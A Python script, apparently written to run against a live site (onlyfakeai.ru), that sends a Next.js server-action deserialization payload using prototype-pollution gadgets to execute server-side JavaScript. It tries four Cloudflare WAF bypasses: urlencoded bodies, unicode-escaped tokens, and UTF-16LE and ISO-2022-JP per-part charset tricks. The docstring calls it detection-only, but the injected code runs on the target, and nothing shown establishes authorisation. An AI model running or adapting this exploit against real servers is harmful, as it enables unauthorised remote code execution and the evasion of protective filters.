#!/usr/bin/env python3
"""React2Shell CF-WAF bypass attempts via transport/encoding differentials:
 1) application/x-www-form-urlencoded (Next supports it for no-JS server action forms)
 2) part-level Content-Type charset differential (CF may decode per-part; busboy does not)
 3) duplicate Content-Disposition line trick
Detection-only marker JS (process.version + NEXT_REDIRECT digest). No shell/files."""
import ssl, json, time, random, string, http.cookiejar, urllib.request, urllib.error, urllib.parse

CTX = ssl.create_default_context()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
BASE = "https://onlyfakeai.ru"
cj = http.cookiejar.CookieJar()
OPENER = urllib.request.build_opener(urllib.request.HTTPSHandler(context=CTX),
                                     urllib.request.HTTPCookieProcessor(cj))
MARK = "R2S_AUDIT_PROBE_"
PREFIX = ("var res=(typeof process!=='undefined'?process.version:'noproc');"
          "throw Object.assign(new Error('NEXT_REDIRECT'),"
          "{digest:'" + MARK + "'+res});")
P0 = ('{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
      '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":'
      + json.dumps(PREFIX) +
      ',"_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}')


def req(method, url, headers=None, body=None, timeout=30):
    h = {"User-Agent": UA, "Accept": "*/*"}
    if headers:
        h.update(headers)
    r = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with OPENER.open(r, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return 0, {}, str(e).encode()


def is_cf(b):
    return "Attention Required" in b.decode("utf-8", "ignore")[:3000]


def rnd(n=24):
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))


def post(tag, ctype, body, extra=None):
    h = {"Content-Type": ctype, "Next-Action": rnd(40), "Accept": "text/x-component",
         "Origin": BASE, "Referer": BASE + "/"}
    if extra:
        h.update(extra)
    st, hd, b = req("POST", BASE + "/", headers=h, body=body)
    t = b.decode("utf-8", "ignore")
    print(f"[{tag}] HTTP {st} cf={is_cf(b)} marker={MARK in t} len={len(b)}")
    if st != 403:
        print("   body:", t[:280].replace("\n", " "))
    if MARK in t:
        i = t.find(MARK)
        print("   >>> DIGEST:", t[i:i + 160].replace("\n", " "))
    time.sleep(2)
    return st, t


req("GET", BASE + "/")
time.sleep(1)

# 1) urlencoded form body (Next accepts for progressive-enhancement action forms)
form = urllib.parse.urlencode({"0": P0, "1": '"$@0"', "2": "[]"})
post("urlencoded gadget", "application/x-www-form-urlencoded", form.encode())

# 2) urlencoded with JSON-escaped tokens
P0_esc = P0.replace("$1:__proto__:then", "\\u00241:\\u005f\\u005fproto\\u005f\\u005f:then") \
            .replace("$1:constructor:constructor", "\\u00241:constructor:constructor")
form2 = urllib.parse.urlencode({"0": P0_esc, "1": '"$@0"', "2": "[]"})
post("urlencoded escaped", "application/x-www-form-urlencoded", form2.encode())

# 3) multipart with per-part charset differential (CF decodes per part; busboy gives raw)
bnd = "----B" + rnd(30)
body = (
    f"--{bnd}\r\nContent-Disposition: form-data; name=\"0\"\r\n"
    f"Content-Type: text/plain; charset=utf-16le\r\n\r\n{P0}\r\n"
    f"--{bnd}\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"\r\n"
    f"--{bnd}\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n[]\r\n"
    f"--{bnd}--\r\n"
).encode()
post("part-charset-utf16le", f"multipart/form-data; boundary={bnd}", body)

# 4) multipart with part-level Content-Type application/json;charset=iso-2022-jp
bnd = "----B" + rnd(30)
body = (
    f"--{bnd}\r\nContent-Disposition: form-data; name=\"0\"\r\n"
    f"Content-Type: application/json; charset=iso-2022-jp\r\n\r\n{P0}\r\n"
    f"--{bnd}\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"\r\n"
    f"--{bnd}\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n[]\r\n"
    f"--{bnd}--\r\n"
).encode()
post("part-json-iso2022jp", f"multipart/form-data; boundary={bnd}", body)
